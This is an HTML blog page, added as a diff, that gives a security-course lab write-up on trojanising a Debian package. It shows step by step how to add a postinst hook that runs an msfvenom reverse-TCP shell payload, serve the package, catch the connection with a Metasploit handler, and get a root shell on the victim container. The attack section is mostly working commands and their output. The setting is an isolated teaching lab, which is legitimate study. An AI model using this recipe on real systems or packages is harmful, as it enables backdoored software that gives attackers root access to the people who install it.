@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Malware Debian</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>Credits for this challenge go to KC Udonsi. We will use a malicious Debian package
+(a trojan)
+to install a RAT (Remote Admin Tool) into the target’s device.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#manipulating-the-deb" id="markdown-toc-manipulating-the-deb">Manipulating the Deb</a></li>
+  <li><a href="#injecting-the-malware-msfvenom" id="markdown-toc-injecting-the-malware-msfvenom">Injecting the Malware (msfvenom)</a></li>
+  <li><a href="#the-target-installs-the-trojan" id="markdown-toc-the-target-installs-the-trojan">The Target Installs the Trojan</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>As usual when working with networks, we start with our docker-compose file</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+    
+  <span class="na">alice</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">networks</span><span class="pi">:</span>
+        <span class="na">internal</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+      <span class="na">cap_add</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+        <span class="pi">-</span> <span class="s">SYS_ADMIN</span>
+        
+  <span class="na">mallory</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
+      <span class="na">cap_add</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+      <span class="na">volumes</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s">.:/shared</span>
+      <span class="na">networks</span><span class="pi">:</span>
+        <span class="na">internal</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>
+
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">internal</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
+</code></pre></div></div>
+
+<p>and start the exercise with</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compse up -d
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="manipulating-the-deb">Manipulating the Deb</h2>
+
+<hr />
+
+<p>We open an interactive shell for Mallory and start by extracting (<code class="language-plaintext highlighter-rouge">-x</code>) a legitimale deb file
+<code class="language-plaintext highlighter-rouge">legitimate_0.1.0_all.deb</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec -it mallory bash
+# dpkg -x legitimate_0.1.0_all.deb legitimate_0.1.0_all
+</code></pre></div></div>
+
+<p>next, we create a file <code class="language-plaintext highlighter-rouge">legitimate_0.1.0_all/DEBIAN/control</code> which contains</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Package: legitimate
+Version: 0.1.0
+Section: misc
+Priority: optional
+Architecture: i386
+Maintainer: mallory
+Description: Just another trojan
+</code></pre></div></div>
+
+<p>; A second <code class="language-plaintext highlighter-rouge">legitimate_0.1.0_all/DEBIAN/postinst</code> with content</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="nb">chmod </span>ugo+x /usr/share/payload <span class="o">&amp;&amp;</span> /usr/share/payload &amp;
+</code></pre></div></div>
+
+<p>and give it execute permissions (<code class="language-plaintext highlighter-rouge">ugo</code> is to add permissions to the <em>owner</em>, <em>groups</em>, and <em>others</em>).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod ugo+x
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="injecting-the-malware-msfvenom">Injecting the Malware (msfvenom)</h2>
+
+<hr />
+
+<p>Finally, we can craft our Trojan Horse malware using <code class="language-plaintext highlighter-rouge">msfvenom</code>. This attack will
+allow us to open a <a href="https://en.wikipedia.org/wiki/Reverse_connection">reverse shell</a>.</p>
+
+<p>The used options here are</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-a</code> specifies the architecture</li>
+  <li><code class="language-plaintext highlighter-rouge">-p</code> specifies the payload</li>
+  <li><code class="language-plaintext highlighter-rouge">-b</code> a list of “bad” characters or characters to avoid</li>
+  <li><code class="language-plaintext highlighter-rouge">-f</code> the output format</li>
+  <li><code class="language-plaintext highlighter-rouge">-o</code> the output file of the payload</li>
+  <li><code class="language-plaintext highlighter-rouge">LHOST</code> and <code class="language-plaintext highlighter-rouge">LPORT</code> are the IP and port we will be listening on for connections</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.0.3 LPORT=443 -b "\x00" -f elf -o legitimate_0.1.0_all/usr/share/payload
+</code></pre></div></div>
+
+<p>Finally, we repackage the malware into a deb file</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dpkg-deb --build legitimate_0.1.0_all
+</code></pre></div></div>
+
+<p>All that remains now is to distribute the malware. For simplicity, we can have Mallory
+run a server using</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python -m SimpleHTTPServer 80
+</code></pre></div></div>
+
+<p>Mallory can also open a second shell session again using Metasploit
+<a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole/">msfconsole</a>
+to handle the reverse shell server.</p>
+
+<p>The options used are</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-q</code> or <strong>quiet</strong> to not print the banner on startup</li>
+  <li><code class="language-plaintext highlighter-rouge">-x</code> to execute the string which follows as a command</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.0.3; set LPORT 443; run; exit -y"
+PAYLOAD =&gt; linux/x86/shell/reverse_tcp
+LHOST =&gt; 10.0.0.3
+LPORT =&gt; 443
+[*] Started reverse TCP handler on 10.0.0.3:443
+[*] Starting the payload handler...
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="the-target-installs-the-trojan">The Target Installs the Trojan</h2>
+
+<hr />
+
+<p>with these two open, we suppose Alice obtains and installs (<code class="language-plaintext highlighter-rouge">-i</code>) the file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec alice wget http://10.0.0.3/legitimate_0.1.0_all.deb
+$ docker exec alice dpkg -i legitimate_0.1.0_all.deb
+</code></pre></div></div>
+
+<p>Upon installing, we notice Mallory’s shell has updated</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending stage (36 bytes) to 10.0.0.2
+[*] Command shell session 1 opened (10.0.0.3:443 -&gt; 10.0.0.2:44088)
+</code></pre></div></div>
+
+<p>we now have a running shell and though it may be missing the traditional
+prompt we see that commands still work as intended.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
+root
+</code></pre></div></div>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
